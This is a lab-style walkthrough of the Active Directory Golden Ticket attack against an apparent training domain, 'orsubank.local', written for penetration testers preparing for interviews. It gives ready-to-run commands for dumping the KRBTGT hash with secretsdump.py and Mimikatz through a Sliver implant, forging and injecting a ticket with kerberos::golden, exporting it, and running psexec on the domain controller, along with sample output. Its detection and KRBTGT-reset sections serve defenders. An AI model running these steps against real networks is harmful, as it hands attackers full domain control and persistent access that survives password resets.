# GOLDEN TICKET: THE COMPLETE GUIDE
## Unlimited Domain Access That Survives Password Changes

> **The Golden Ticket is the ULTIMATE persistence technique in Active Directory.**
>
> Once you have the KRBTGT hash, you can:
> - Create your own Kerberos tickets
> - Claim to be ANY user (even fake ones)
> - Access ANY resource in the domain
> - Persist even after password resets!
>
> This guide explains EVERYTHING from the ground up.

---

# TABLE OF CONTENTS

**ABSOLUTE FUNDAMENTALS (START HERE!)**
0. [Understanding Golden Tickets from Zero](#part-0-fundamentals)

**PART 1: Understanding the Golden Ticket**
- What is the KRBTGT account?
- What is a TGT (Ticket Granting Ticket)?
- Why is the Golden Ticket so powerful?

**PART 2: Prerequisites**
- Getting Domain Admin access first
- Extracting the KRBTGT hash (DCSync)

**PART 3: Creating the Golden Ticket**
- Using Mimikatz via Sliver
- Understanding the parameters
- Injecting the ticket

**PART 4: Using the Golden Ticket**
- Accessing any computer as anyone
- Accessing domain controllers
- It survives password changes!

**PART 5: Detection and Defense**
- How defenders detect Golden Tickets
- How to reset the KRBTGT

**PART 6: Interview Questions (10+)**

---

# PART 0: Understanding Golden Tickets from Zero {#part-0-fundamentals}

**This is the most powerful persistence technique in Active Directory. Let's understand WHY it works.**

---

## 0.1: Recap - How Does Kerberos Authentication Work?

**Quick refresher from earlier walkthroughs:**

```
KERBEROS AUTHENTICATION FLOW:
────────────────────────────────────────────────────────────────

STEP 1: You login with password
        YOU ──[Password]──→ KDC
        KDC validates password
        KDC ──[TGT]──→ YOU
        
        TGT = Ticket Granting Ticket (your "day pass")
        TGT is ENCRYPTED with KRBTGT's hash

STEP 2: You want to access a service (e.g., file share)
        YOU ──[TGT + "I want file share"]──→ KDC
        KDC decrypts TGT (using KRBTGT hash)
        KDC ──[Service Ticket]──→ YOU

STEP 3: You access the service
        YOU ──[Service Ticket]──→ File Server
        Access granted!
```

**Key insight:** The TGT is encrypted with the KRBTGT account's password hash.

---

## 0.2: What is KRBTGT? (The Master Key)

**KRBTGT is a special account that exists in EVERY Active Directory domain.**

```
KRBTGT ACCOUNT:
────────────────────────────────────────────────────────────────

WHAT IT IS:
• A built-in AD account (created when you create the domain)
• Name comes from "Kerberos Ticket Granting Ticket"
• Located: Active Directory Users and Computers → Users → krbtgt

WHAT IT DOES:
• Its password hash is used to ENCRYPT all TGTs
• When KDC creates a TGT, it encrypts it with KRBTGT's hash
• When KDC receives a TGT, it decrypts it with KRBTGT's hash

SPECIAL PROPERTIES:
• Account is DISABLED (can't login as krbtgt)
• Password is 127+ characters, randomly generated
• Password is NEVER changed unless admin does it manually
• It's the SAME password on every DC (replicated)
```

**Think of KRBTGT as the "stamp of authenticity" for Kerberos tickets.**

---

## 0.3: The Golden Ticket Insight - If YOU Have the Key...

**Here's the critical realization:**

```
NORMAL OPERATION:
────────────────────────────────────────────────────────────────

KDC creates TGT:
1. User proves identity (password)
2. KDC creates TGT with user info (username, groups, expiration)
3. KDC ENCRYPTS TGT with KRBTGT hash
4. User receives encrypted TGT

Later, user presents TGT:
1. KDC DECRYPTS TGT with KRBTGT hash
2. KDC sees: "This is vamsi.krishna, member of Domain Users"
3. KDC trusts this because ONLY it can decrypt/create these!


THE GOLDEN TICKET ATTACK:
────────────────────────────────────────────────────────────────

Attacker has KRBTGT hash (from DCSync):
1. Attacker CREATES their own TGT
2. Attacker fills in: username="FakeAdmin", groups="Domain Admins"
3. Attacker ENCRYPTS with KRBTGT hash
4. Attacker now has a forged TGT!

When attacker uses this TGT:
1. KDC DECRYPTS TGT with KRBTGT hash
2. KDC sees: "This is FakeAdmin, member of Domain Admins"
3. KDC trusts this - the encryption is VALID!
4. Access granted as Domain Admin!


THE KDC CANNOT TELL THE DIFFERENCE!
The encryption is mathematically correct.
```

---

## 0.4: Why Is It Called "Golden"?

**There are actually THREE types of forged Kerberos tickets:**

| Ticket Type | What You Need | What You Get |
|-------------|--------------|--------------|
| **Golden Ticket** | KRBTGT hash | Access to EVERYTHING in the domain |
| **Silver Ticket** | Service account hash | Access to ONE specific service |
| **Diamond Ticket** | KRBTGT hash + more | Harder to detect (modifies real tickets) |

**Golden = Full domain access. The "gold standard" of persistence.**

```
WHY "GOLDEN":
────────────────────────────────────────────────────────────────

SILVER TICKET:
• You have svc_sql's hash
• You can forge tickets for SQL ONLY
• Limited scope

GOLDEN TICKET:
• You have KRBTGT's hash
• You can forge TGTs for ANY user
• TGTs can access ANY service
• Unlimited scope = GOLD!
```

---

## 0.5: Why Does Golden Ticket Survive Password Resets?

**This is what makes Golden Tickets truly powerful:**

```
SCENARIO: You forge a Golden Ticket as "Administrator"
────────────────────────────────────────────────────────────────

DAY 1:
• You DCSync and get KRBTGT hash
• You create Golden Ticket claiming to be "Administrator"
• You access DC01 as Administrator ✓

DAY 2:
• Blue team notices compromise
• Blue team RESETS Administrator's password
• They think: "We're safe now!"

DAY 3:
• You use your Golden Ticket again
• IT STILL WORKS! ✓

WHY?

The TGT is encrypted with KRBTGT hash, not Administrator's hash!
KDC checks: "Is this encrypted with KRBTGT?" → YES → VALID!
It doesn't matter what Administrator's password is!

TO STOP YOUR TICKET:
Blue team must reset KRBTGT password (twice!)
This is rarely done because it's disruptive.
```

---

## 0.6: What Information Does a TGT Contain?

**When you forge a Golden Ticket, you're creating this structure:**

```
TGT CONTENTS (simplified):
────────────────────────────────────────────────────────────────

{
    "username": "FakeAdmin",              ← You choose ANY name
    "domain": "ORSUBANK.LOCAL",           ← Target domain
    "user_id": 500,                       ← RID (500 = Administrator)
    "groups": [512, 513, 519, 520],       ← Group RIDs
              512 = Domain Admins
              513 = Domain Users
              519 = Enterprise Admins
              520 = Group Policy Creators
    "valid_from": "2024-12-28 10:00",
    "valid_until": "2034-12-28 10:00",    ← You can set 10+ YEARS!
    "session_key": [random bytes]
}

This entire structure is ENCRYPTED with KRBTGT's hash.
When KDC receives it, it decrypts and trusts the contents.
```

---

## 0.7: The Attack Flow - Step by Step

```
GOLDEN TICKET ATTACK FLOW:
────────────────────────────────────────────────────────────────

PREREQUISITE: You already have Domain Admin access
              (Via Kerberoasting, ACL abuse, credential dumping, etc.)

STEP 1: DCSync to get KRBTGT hash
        └── secretsdump.py or Mimikatz lsadump::dcsync

STEP 2: Get Domain SID
        └── S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

STEP 3: Create Golden Ticket
        └── Mimikatz kerberos::golden

STEP 4: Inject ticket into memory
        └── /ptt parameter or kerberos::ptt

STEP 5: Access ANY resource as ANY user!
        └── dir \\DC01\C$
        └── psexec \\DC01 cmd.exe

PERSISTENCE:
• Save the .kirbi file
• Use it anytime for the next 10 years (or until KRBTGT reset)
• Works even after password changes!
```

---

## 0.8: Golden Ticket vs Other Persistence Techniques

| Technique | Survives Password Change? | Survives AD Restore? | Detection Difficulty |
|-----------|--------------------------|---------------------|---------------------|
| **Golden Ticket** | ✅ YES | ❌ NO | Medium |
| **Password (plaintext)** | ❌ NO | ✅ YES | Low |
| **NTLM Hash** | ❌ NO | ✅ YES | Low |
| **AdminSDHolder** | ✅ YES | ✅ YES | Medium |
| **DCSync Rights** | ✅ YES | ❌ NO | Medium |
| **Skeleton Key** | ✅ YES | ❌ NO | High |

**Golden Ticket is the go-to for persistence that survives credential rotation!**

---

## 0.9: Summary Before Creating Your Ticket

| Concept | What It Is |
|---------|-----------|
| **KRBTGT** | Special AD account whose hash encrypts ALL TGTs |
| **Golden Ticket** | Forged TGT that you create using KRBTGT hash |
| **Why It Works** | KDC can't distinguish real vs forged (same encryption) |
| **What You Need** | KRBTGT hash + Domain SID + Domain name |
| **What You Get** | Access to ANYTHING as ANYONE for as long as you want |
| **How to Stop It** | Reset KRBTGT password TWICE |

**Now let's create one...**

---

# PART 1: Understanding the Golden Ticket (Technical Details)

## 1.1: What is the KRBTGT Account?

**KRBTGT = The Kerberos Ticket Granting Ticket service account**

```
KRBTGT ACCOUNT:
───────────────

• Created automatically when you create a domain
• Exists on every Domain Controller
• Has a password that's NEVER used by humans
• Its ONLY purpose: Sign/encrypt Kerberos TGTs
• The password hash is the "master key" for Kerberos
```

**The KRBTGT hash is the most sensitive credential in Active Directory.**

---

## 1.2: What is a TGT?

**TGT = Ticket Granting Ticket = Your "master pass" in the Kerberos world**

```
KERBEROS FLOW REMINDER:
───────────────────────

1. You login → You get a TGT (signed by KRBTGT)
2. You want to access a service → You show your TGT
3. KDC says: "Valid TGT! Here's a service ticket for that service"
4. You access the service with the service ticket

THE TGT IS LIKE A VIP WRISTBAND:
Once you have it, you can get to any service!
```

### How TGTs Are Created (Normal Flow):
```
1. User enters password
2. KDC verifies password
3. KDC creates TGT containing:
   - Username
   - Groups (Domain Admins, etc.)
   - Expiration time
4. KDC ENCRYPTS TGT with KRBTGT's password hash
5. User receives encrypted TGT
```

---

## 1.3: The Golden Ticket Attack

**The Attack:** We have the KRBTGT hash, so we can CREATE our own TGTs!

```
GOLDEN TICKET INSIGHT:
──────────────────────

Normal: KDC creates TGT, encrypts with KRBTGT hash
Attack: WE create TGT, encrypt with KRBTGT hash

If we have the KRBTGT hash:
→ We can forge TGTs
→ We can claim to be ANY user
→ We can claim membership in ANY group
→ We can set ANY expiration time (even 10 years!)
→ KDC will accept it as legit!
```

---

## 1.4: Why It's Called "Golden"

```
WHY "GOLDEN" TICKET:
────────────────────

🎫 Normal Ticket (Silver): Access to ONE service
   - If you have SQL service account hash
   - You can only forge tickets for SQL

👑 Golden Ticket: Access to EVERYTHING
   - If you have KRBTGT hash
   - You can forge tickets for ANY service
   - You ARE the domain!
```

---

## 1.5: Real-World Analogy

```
GOLDEN TICKET = MASTER KEY TO THE CITY
──────────────────────────────────────

Imagine a city where:
• Every door uses electronic locks
• A central authority (Mayor) signs digital keys
• If you have the Mayor's official stamp, any lock opens

NORMAL: You go to Mayor, prove identity, get a key to your house
GOLDEN TICKET: You stole the Mayor's stamp
              Now you can make keys to EVERY house
              You can claim to be the Mayor yourself!
              Even if Mayor changes locks, your stamp still works
              (until Mayor gets a NEW stamp - which rarely happens)
```

---

# 📖 PART 2: Prerequisites

## 2.1: You Need Domain Admin First!

**Golden Ticket requires the KRBTGT hash.**
**Getting the KRBTGT hash requires Domain Admin.**

**Paths to get here:**
- Kerberoasting svc_backup → DA (Walkthrough 02)
- ACL Abuse → Reset lakshmi.devi password → DA (Walkthrough 06)
- Credential Dumping + Pass-the-Hash → Session Hunting → DA (Walkthroughs 04, 07)

---

## 2.2: Extracting the KRBTGT Hash (DCSync)

**DCSync = Pretending to be a Domain Controller to get password hashes**

### Method 1: secretsdump.py (From Kali)

If you have Domain Admin credentials:
```bash
secretsdump.py orsubank.local/lakshmi.devi:'NewPassword123!'@DC01.orsubank.local -just-dc-user krbtgt
```

**Output:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4:::
```

**Save this hash:** `a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4`

### Method 2: Mimikatz DCSync (From Sliver)

```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "lsadump::dcsync /domain:orsubank.local /user:krbtgt" "exit"
```

**Look for:**
```
Object RDN           : krbtgt

** SAM ACCOUNT **
SAM Username         : krbtgt

Hash NTLM: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
```

---

## 2.3: Get Additional Information

You also need:
- **Domain SID:** Security Identifier for the domain
- **Domain Name:** orsubank.local

**Get Domain SID:**
```bash
# From Kali with impacket
lookupsid.py orsubank.local/lakshmi.devi:'NewPassword123!'@DC01.orsubank.local | grep "Domain SID"
```

Or:
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "(Get-ADDomain).DomainSID.Value"
```

**Example output:** `S-1-5-21-1234567890-1234567890-1234567890`

---

# 📖 PART 3: Creating the Golden Ticket

## 3.1: The Mimikatz Command

**Using Mimikatz via Sliver:**

```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:orsubank.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /ptt" "exit"
```

---

## 3.2: Understanding Each Parameter

| Parameter | Value | Meaning |
|-----------|-------|---------|
| `/user:FakeAdmin` | Any username | Can be real or FAKE! |
| `/domain:orsubank.local` | Domain name | Your target domain |
| `/sid:S-1-5-21-...` | Domain SID | Identifies the domain |
| `/krbtgt:a1b2c3d4...` | KRBTGT NTLM hash | The "master key" |
| `/ptt` | Pass-The-Ticket | Inject ticket into memory immediately |

---

## 3.3: Optional Parameters

| Parameter | Example | Description |
|-----------|---------|-------------|
| `/id:500` | 500 | RID (500 = Administrator) |
| `/groups:512,513,518,519,520` | Group RIDs | 512=Domain Admins, 519=Enterprise Admins |
| `/ticket:golden.kirbi` | Filename | Save ticket to file instead of injecting |

**Full Command with All Options:**
```bash
kerberos::golden /user:GoldenAdmin /domain:orsubank.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /id:500 /groups:512,513,518,519,520 /ptt
```

---

## 3.4: Verify Ticket is Loaded

**Check your tickets:**
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "kerberos::list" "exit"
```

**Or with klist:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o klist.exe
```

**You should see your forged TGT!**

---

# 📖 PART 4: Using the Golden Ticket

## 4.1: Access the Domain Controller

**Now that you have the Golden Ticket loaded, access DC01:**

```bash
[server] sliver (ORSUBANK_WS01) > execute -o cmd.exe -c "dir \\DC01\C$"
```

**Should work! You can access the C$ share on the DC!**

---

## 4.2: Run Commands on DC

**Using psexec module in Mimikatz:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o cmd.exe -c "psexec \\DC01 cmd.exe"
```

**Or from Kali using impacket with the ticket:**
```bash
# Export ticket first
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:orsubank.local /sid:S-1-5-21-... /krbtgt:... /ticket:golden.kirbi" "exit"

# Download the ticket
[server] sliver (ORSUBANK_WS01) > download golden.kirbi /tmp/

# Use with impacket
export KRB5CCNAME=/tmp/golden.ccache
ticketConverter.py golden.kirbi golden.ccache
psexec.py -k -no-pass orsubank.local/FakeAdmin@DC01.orsubank.local
```

---

## 4.3: Why It Survives Password Changes

**Key insight:** The KRBTGT hash is what validates your ticket, not the user's password.

```
PASSWORD RESET = USELESS AGAINST GOLDEN TICKET:
───────────────────────────────────────────────

Scenario:
1. You forge ticket claiming to be "Administrator"
2. Real Administrator changes their password
3. Your Golden Ticket still works!

Why?
- Your TGT is signed with KRBTGT hash
- User password doesn't matter for TGT validation
- KDC checks: "Is this encrypted with KRBTGT?"  ✓ Yes = Valid!
```

**The ONLY way to stop a Golden Ticket is to reset the KRBTGT password TWICE.**

---

# 📖 PART 5: Detection and Defense

## 5.1: How Defenders Detect Golden Tickets

| Detection Method | What They Look For |
|------------------|-------------------|
| **Event ID 4769** | TGS requests for non-existent users |
| **Ticket Lifetime** | TGTs with unusual expiration (10 years!) |
| **Encryption Type** | RC4 when AES is expected |
| **Request Anomaly** | TGS request without prior AS request |

---

## 5.2: Resetting KRBTGT (The Defense)

**To stop Golden Tickets, defenders must:**

1. Reset KRBTGT password TWICE
2. Wait at least 10 hours between resets (for replication)
3. This invalidates ALL existing tickets (including Golden Tickets)

**Why twice?**
- AD keeps the current AND previous KRBTGT hash
- First reset moves current to "previous"
- Second reset removes the compromised hash completely

---

# 📖 PART 6: Interview Questions

## Q1: "What is a Golden Ticket attack?"

**YOUR ANSWER:**
"A Golden Ticket attack is a persistence technique where an attacker forges a Kerberos TGT (Ticket Granting Ticket) using the KRBTGT account's password hash.

The KRBTGT account is the key signing authority for all Kerberos tickets in a domain. If an attacker obtains its NTLM hash (typically via DCSync after achieving Domain Admin), they can create their own TGTs claiming to be any user with any group membership.

The forged TGT is indistinguishable from legitimate tickets because it's signed with the real KRBTGT key. This provides unlimited access to any resource in the domain and persists even if user passwords are changed. The only remediation is resetting the KRBTGT password twice."

---

## Q2: "What's required to perform a Golden Ticket attack?"

**YOUR ANSWER:**
"To create a Golden Ticket, you need:

1. **KRBTGT NTLM hash** - The master signing key, obtained via:
   - DCSync with DA credentials
   - NTDS.dit extraction and offline attack
   
2. **Domain SID** - The domain's security identifier
   - Get with `(Get-ADDomain).DomainSID` or impacket's lookupsid.py

3. **Domain FQDN** - The fully qualified domain name

4. **Target username** - Can be ANY name, even fake ones

5. **Optional: Group RIDs** - To specify group membership (512 = Domain Admins)

The prerequisite is Domain Admin access because that's what's needed to extract the KRBTGT hash."

---

## Q3: "How is Golden Ticket different from Silver Ticket?"

**YOUR ANSWER:**
"Key differences:

| Aspect | Golden Ticket | Silver Ticket |
|--------|---------------|---------------|
| Hash Required | KRBTGT | Service account |
| Scope | Entire domain | Single service |
| Ticket Type | TGT (Ticket Granting Ticket) | TGS (Service Ticket) |
| Can Access DC | Yes | No |
| Detection | TGS without AS | Harder (no DC involvement) |

**Silver Tickets** are useful when:
- You only have a service account hash (from Kerberoasting)
- You want to be stealthier (doesn't touch DC)
- You only need access to one service

**Golden Tickets** are superior when:
- You have KRBTGT hash
- You need domain-wide persistent access
- You want to survive password resets"

---

## Q4: "How do you detect and remediate a Golden Ticket attack?"

**YOUR ANSWER:**
"**Detection:**
1. Event ID 4769 for non-existent users
2. TGT tickets with abnormal lifetimes (> 10 hours)
3. TGS requests without corresponding AS-REQ
4. Tickets encrypted with RC4 when AES is expected
5. Service access from users with no business need

**Remediation:**
1. Reset KRBTGT password TWICE with 10+ hours between resets
2. The wait allows replication and existing legitimate tickets to expire
3. This invalidates ALL golden tickets

**Prevention:**
1. Protect Domain Admin accounts strictly
2. Enable Credential Guard on DCs
3. Monitor DCSync (Event ID 4662 with replication rights)
4. Use Admin Tier model to limit DA exposure"

---

## Q5: "Why do you need to reset KRBTGT twice?"

**YOUR ANSWER:**
"Active Directory maintains two KRBTGT password hashes - the current one and the previous one. This is for continuity during normal password rotation.

When you reset KRBTGT:
- First reset: Current hash becomes 'previous', new hash becomes 'current'
- Tickets signed with old hash are still valid (because AD checks both)

Second reset (after waiting):
- Previous hash (the compromised one) is replaced
- Now only tickets signed with completely new hashes work
- Golden Tickets signed with the original compromised hash are invalidated

The 10-hour wait between resets allows domain-wide replication and gives legitimate tickets time to expire naturally."

---

# ✅ CHECKLIST

- [ ] Achieved Domain Admin access (via previous walkthroughs)
- [ ] Extracted KRBTGT hash via DCSync
- [ ] Got Domain SID
- [ ] Created Golden Ticket with Mimikatz
- [ ] Verified ticket is loaded (kerberos::list)
- [ ] Accessed DC01 using the Golden Ticket
- [ ] Tested persistence (ticket still works after logout)

---

# 🔗 What's Next?

**For complete attack understanding:**
→ **[04b. DCSync Attack](./04b_dcsync_attack.md)** (How to extract KRBTGT and all hashes)

**For alternative Kerberos attacks:**
→ **[06b. Pass-the-Ticket](./06b_pass_the_ticket.md)** (Steal and reuse legitimate tickets)

**For defense evasion:**
→ Review detection evasion techniques in Walkthrough 00

---

**MITRE ATT&CK Mapping:**
| Technique | ID | Description |
|-----------|-----|-------------|
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 | Golden Ticket |
| OS Credential Dumping: DCSync | T1003.006 | Extracting KRBTGT |

**Difficulty:** ⭐⭐⭐⭐ (Advanced)
**Interview Importance:** ⭐⭐⭐⭐⭐ (THE most asked persistence question)

---
